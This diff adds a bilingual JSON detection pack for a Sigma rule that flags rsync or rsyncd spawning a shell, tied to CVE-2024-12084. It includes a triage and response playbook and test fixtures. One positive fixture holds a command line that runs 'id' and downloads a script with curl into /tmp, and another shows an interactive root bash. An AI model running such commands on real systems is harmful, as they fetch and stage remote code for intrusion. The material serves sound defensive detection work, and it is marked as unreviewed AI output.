@@ -1,0 +1,140 @@
+{
+  "rule": {
+    "id": "297241f3-8108-4b3a-8c15-2dda9f844594",
+    "title": "Suspicious Invocation of Shell via Rsync",
+    "level": "high",
+    "status": "experimental",
+    "author": "Florian Roth",
+    "path": "linux/process_creation/proc_creation_lnx_rsync_shell_spawn.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_rsync_shell_spawn.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059",
+      "T1203"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso rsync o rsyncd inició un shell (sh, bash, dash, zsh, etc.) y la línea de comandos de ese shell no contiene la opción \" -e \". Puede indicar ejecución de comandos arbitrarios mediante la explotación de rsync, como la descrita en CVE-2024-12084.",
+      "what_it_detects": "Eventos de creación de procesos en Linux donde ParentImage termina en /rsync o /rsyncd, Image es un shell conocido (ash, bash, csh, dash, ksh, sh, tcsh, zsh) y CommandLine no contiene \" -e \".",
+      "why_it_matters": "Si un atacante explota un servicio rsync expuesto, puede ejecutar comandos con los privilegios del daemon (T1203, explotación para ejecución de cliente) mediante un intérprete de comandos (T1059). Esto puede llevar a acceso persistente, movimiento lateral o escalamiento de privilegios.",
+      "triage_steps": [
+        "Revise CommandLine del shell: busque comandos de reconocimiento (id, whoami, uname), descargas con curl/wget, reverse shells o escritura en /tmp.",
+        "Confirme ParentImage y la línea de comandos del rsync padre: ¿es rsyncd en modo --daemon expuesto en red o un rsync de cliente ejecutado por un usuario o un cron?",
+        "Identifique el usuario y el UID del shell; un shell hijo de rsyncd con root es especialmente grave.",
+        "Revise los procesos hijos del shell y toda la actividad del mismo host en +/- 15 minutos: conexiones salientes, archivos nuevos, cambios en crontab o authorized_keys.",
+        "Correlacione las conexiones entrantes al puerto 873/TCP o vía SSH con la IP de origen en el momento del alerta y busque esa IP en otros hosts.",
+        "Verifique la versión de rsync instalada y si está parcheada contra CVE-2024-12084.",
+        "Revise rsyncd.conf para directivas pre-xfer exec o post-xfer exec que expliquen el shell legítimamente.",
+        "Busque alertas previas para el mismo host, usuario o IP de origen."
+      ],
+      "false_positives": [
+        "Scripts pre-xfer exec o post-xfer exec configurados en rsyncd.conf, que el daemon ejecuta mediante un shell.",
+        "Shell remoto definido con --rsh=, la variable RSYNC_RSH o un wrapper, sin la cadena literal \" -e \".",
+        "Herramientas de respaldo o sincronización que envuelven rsync y lanzan scripts de shell auxiliares."
+      ],
+      "response_steps": [
+        "Valide con el responsable del sistema si el comando ejecutado corresponde a una configuración o tarea conocida antes de actuar.",
+        "Si no hay justificación, aísle el host de la red y bloquee la IP de origen; detenga el servicio rsyncd si está expuesto.",
+        "Preserve evidencia: árbol de procesos, conexiones activas, logs de rsyncd y archivos creados, antes de terminar procesos.",
+        "Elimine la persistencia identificada, rote las credenciales accesibles desde el host y actualice rsync a una versión corregida.",
+        "Restrinja el acceso al puerto 873 a orígenes autorizados y monitoree el host tras restablecerlo."
+      ],
+      "severity_rationale": "El nivel alto es adecuado porque rsync rara vez lanza un shell sin \" -e \", y cuando ocurre puede indicar ejecución remota de código en un servicio expuesto."
+    },
+    "en": {
+      "summary": "An rsync or rsyncd process spawned a shell (sh, bash, dash, zsh, etc.) whose command line lacks the \" -e \" option. This may indicate arbitrary command execution through rsync exploitation, as described in CVE-2024-12084.",
+      "what_it_detects": "Linux process creation events where ParentImage ends with /rsync or /rsyncd, Image is a known shell (ash, bash, csh, dash, ksh, sh, tcsh, zsh) and CommandLine does not contain \" -e \".",
+      "why_it_matters": "An attacker exploiting an exposed rsync service can run commands with the daemon's privileges (T1203, exploitation for client execution) through a command interpreter (T1059), leading to persistence, lateral movement or privilege escalation.",
+      "triage_steps": [
+        "Review the shell's CommandLine: look for recon commands (id, whoami, uname), curl/wget downloads, reverse shells or writes to /tmp.",
+        "Confirm ParentImage and the parent rsync command line: is it rsyncd --daemon exposed to the network, or a client rsync run by a user or cron job?",
+        "Identify the shell's user and UID; a root shell under rsyncd is especially serious.",
+        "Review the shell's child processes and all activity on the host within +/- 15 minutes: outbound connections, new files, crontab or authorized_keys changes.",
+        "Correlate inbound connections on 873/TCP or SSH at alert time with the source IP, and search for that IP on other hosts.",
+        "Check the installed rsync version and whether it is patched for CVE-2024-12084.",
+        "Review rsyncd.conf for pre-xfer exec or post-xfer exec directives that would explain the shell.",
+        "Search for earlier alerts for the same host, user or source IP."
+      ],
+      "false_positives": [
+        "pre-xfer exec or post-xfer exec scripts configured in rsyncd.conf, which the daemon runs through a shell.",
+        "Remote shell set via --rsh=, the RSYNC_RSH variable or a wrapper, without the literal \" -e \" string.",
+        "Backup or sync tools that wrap rsync and launch helper shell scripts."
+      ],
+      "response_steps": [
+        "Confirm with the system owner whether the command matches a known configuration or job before acting.",
+        "If unexplained, isolate the host and block the source IP; stop rsyncd if it is network-exposed.",
+        "Preserve evidence first: process tree, active connections, rsyncd logs and created files, then terminate malicious processes.",
+        "Remove identified persistence, rotate credentials reachable from the host and upgrade rsync to a fixed version.",
+        "Restrict port 873 to authorized sources and monitor the host after restoring service."
+      ],
+      "severity_rationale": "High fits because rsync rarely spawns a shell without \" -e \", and when it does it may signal remote code execution on an exposed service."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "rsync daemon spawns /bin/sh running reconnaissance and a download, with no ' -e ' in the shell command line",
+        "event": {
+          "ParentImage": "/usr/bin/rsync",
+          "ParentCommandLine": "/usr/bin/rsync --daemon --no-detach",
+          "Image": "/bin/sh",
+          "CommandLine": "sh -c id; curl -s http://203.0.113.15/x.sh -o /tmp/x.sh",
+          "User": "nobody",
+          "ProcessId": 48213,
+          "ParentProcessId": 1102,
+          "CurrentDirectory": "/srv/rsync",
+          "Computer": "backup-02"
+        }
+      },
+      {
+        "description": "rsyncd binary spawns an interactive bash shell",
+        "event": {
+          "ParentImage": "/usr/sbin/rsyncd",
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -i",
+          "User": "root",
+          "ProcessId": 50177,
+          "ParentProcessId": 980,
+          "CurrentDirectory": "/",
+          "Computer": "files-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Shell launched by rsync with the expected ' -e ' flag in its command line (filtered as expected behavior)",
+        "event": {
+          "ParentImage": "/usr/bin/rsync",
+          "Image": "/bin/sh",
+          "CommandLine": "/bin/sh -c rsync -avz -e ssh /data/ backup@backup.example.com:/data/",
+          "User": "svc_backup",
+          "ProcessId": 31544,
+          "ParentProcessId": 31540,
+          "CurrentDirectory": "/home/svc_backup",
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "rsync client starts ssh as its transport, not a shell",
+        "event": {
+          "ParentImage": "/usr/bin/rsync",
+          "Image": "/usr/bin/ssh",
+          "CommandLine": "ssh -l backup backup.example.com rsync --server -vlogDtprze.iLsfxC . /data/",
+          "User": "svc_backup",
+          "ProcessId": 31601,
+          "ParentProcessId": 31600,
+          "CurrentDirectory": "/home/svc_backup",
+          "Computer": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:12+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
